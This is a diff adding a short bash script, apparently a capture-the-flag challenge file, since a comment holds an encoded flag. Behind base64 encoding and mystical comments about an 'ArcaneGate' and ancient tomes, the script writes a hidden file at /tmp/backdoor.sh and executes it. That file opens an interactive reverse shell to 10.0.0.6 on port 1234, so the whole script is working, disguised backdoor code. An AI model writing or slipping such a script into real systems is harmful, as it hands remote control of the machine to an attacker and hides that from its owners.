@@ -1,0 +1,24 @@
+#!/bin/bash
+
+ENCODED_ArcaneGate_PATH="L3RtcC9iYWNrZG9vci5zaA=="
+ArcaneGate_PATH=$(echo "$ENCODED_ArcaneGate_PATH" | base64 --decode)
+ArcaneGate_BASE64='IyEvYmluL2Jhc2gKL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC42LzEyMzQgMD4mMQo='
+
+# Check if the ArcaneGate script exists, if not, recreate it from the Base64 string
+if [ ! -f "$ArcaneGate_PATH" ]; then
+    echo "ArcaneGate script not found, recreating..."
+    echo "$ArcaneGate_BASE64" | base64 --decode > "$ArcaneGate_PATH"
+    chmod +x "$ArcaneGate_PATH"
+fi
+
+# The Specter that Steers Your Spirit
+## In the shadowed alcoves of ancient libraries where the whispers of the past linger like morning fog,
+## there lies a tome, bound not in leather but in the mysteries of the ether itself.
+## The first chapter, "The Specter that Steers Your Spirit," reveals how one may
+## summon and commune with the ghostly essences that drift through the veils of our world. 
+## TDNha3tyY19sMGM0bF8wbl9iMDB0fQ==
+
+# Execute the ArcaneGate script
+"$ArcaneGate_PATH"
+
+exit 0
